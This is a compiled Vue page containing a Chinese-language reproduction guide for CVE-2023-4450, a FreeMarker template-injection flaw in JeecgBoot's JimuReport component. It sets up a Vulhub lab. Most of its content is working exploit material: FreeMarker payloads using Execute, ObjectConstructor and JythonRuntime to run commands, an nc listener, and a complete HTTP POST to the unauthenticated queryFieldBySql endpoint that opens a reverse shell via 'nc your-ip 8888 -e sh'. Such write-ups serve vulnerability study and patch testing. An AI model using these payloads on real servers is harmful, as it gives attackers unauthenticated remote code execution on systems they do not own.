import{_ as i}from"./plugin-vue_export-helper-c27b6911.js";import{r,o as s,c as l,a as e,b as t,d as a,e as o}from"./app-58e4a7d6.js";const u={},d=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),t(" 漏洞描述")],-1),c=e("p",null,"JeecgBoot 是一个开源的低代码开发平台，Jimureport 是低代码报表组件之一",-1),m=e("p",null,[t("当前漏洞在 1.6.1 以下的 Jimureport 组件库中都存在. 由于未授权的 API "),e("code",null,"/jmreport/queryFieldBySql"),t(" 使用了 freemarker 解析 SQL 语句从而导致了 RCE 漏洞的产生.")],-1),p=e("p",null,"参考链接：",-1),v={href:"https://www.oscs1024.com/hd/MPS-4hzd-mb73",target:"_blank",rel:"noopener noreferrer"},h={href:"https://www.reajason.eu.org/writing/freemarkersstimemshell",target:"_blank",rel:"noopener noreferrer"},g={href:"https://github.com/jeecgboot/JimuReport",target:"_blank",rel:"noopener noreferrer"},q=o(`<h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>Vulhub 执行如下命令启动 3.5.3 版本的 JeecgBoot 后端:</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker compose up -d
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>在服务启动后，可访问 <code>http://your-ip:8080/jeecg-boot/jmreport/list</code> 积木工作台页。</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/image-20231021151233971.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>点击新建图表 → 选择 SQL 数据集 → 报表 SQL 中填写 Payload → 点击 SQL 解析。</p><p>poc：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;#assign ex=&quot;freemarker.template.utility.Execute&quot;?new()&gt;\${ex(&quot;nc your-ip 8888 -e sh&quot;)}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>&lt;#assign value=&quot;freemarker.template.utility.ObjectConstructor&quot;?new()&gt;\${value(&quot;java.lang.ProcessBuilder&quot;,&quot;calc&quot;).start ()}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,10),b={href:"https://mp.weixin.qq.com/s/eT32vnk_8anS3e-2B287cA%EF%BC%89%EF%BC%9A",target:"_blank",rel:"noopener noreferrer"},x=o(`<div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>{&quot;sql&quot;:&quot;&lt;#assign value=\\&quot;freemarker.template.utility.Execute\\&quot;?new()&gt;\${value(\\&quot;calc.exe\\&quot;)}&quot;,&quot;dbSource&quot;:&quot;&quot;,&quot;paramArray&quot;:&quot;&quot;,&quot;type&quot;:&quot;&quot;}

#sql的其它可用poc：
&lt;#assign 
value=\\&quot;freemarker.template.utility.ObjectConstructor\\&quot;?new()&gt;\${value(\\&quot;java.lang.ProcessBuilder\\&quot;,\\&quot;calc.exe\\&quot;).start()}

#jython的调用需要满足目标类路径中包含org.python的包，本地复现时引入jython-standalone可正常执行命令
&lt;#assign 
value=\\&quot;freemarker.template.utility.JythonRuntime\\&quot;?new()&gt;&lt;@value&gt;import os;os.system(\\&quot;calc.exe\\&quot;)&lt;/@value&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>反弹 shell，使用 nc 开启监听端口 8888：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code> nc -vvl 8888
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>通过 <code>http://your-ip:8080/jeecg-boot/jmreport/queryFieldBySql</code> sql 参数传递 freemarker payload。</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /jeecg-boot/jmreport/queryFieldBySql HTTP/1.1
Host: your-ip:8088
Content-Type: application/json

{
    &quot;sql&quot;: &quot;&lt;#assign ex=\\&quot;freemarker.template.utility.Execute\\&quot;?new()&gt;\${ex(\\&quot;nc your-ip 8888 -e sh\\&quot;)}&quot;,
    &quot;type&quot;: &quot;0&quot;
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,5);function _(f,y){const n=r("ExternalLinkIcon");return s(),l("div",null,[d,c,m,p,e("ul",null,[e("li",null,[e("a",v,[t("https://www.oscs1024.com/hd/MPS-4hzd-mb73"),a(n)])]),e("li",null,[e("a",h,[t("https://www.reajason.eu.org/writing/freemarkersstimemshell"),a(n)])]),e("li",null,[e("a",g,[t("https://github.com/jeecgboot/JimuReport"),a(n)])])]),q,e("p",null,[t("others（"),e("a",b,[t("https://mp.weixin.qq.com/s/eT32vnk_8anS3e-2B287cA）："),a(n)])]),x])}const j=i(u,[["render",_],["__file","JeecgBoot SSTI CVE-2023-4450.html.vue"]]);export{j as default};
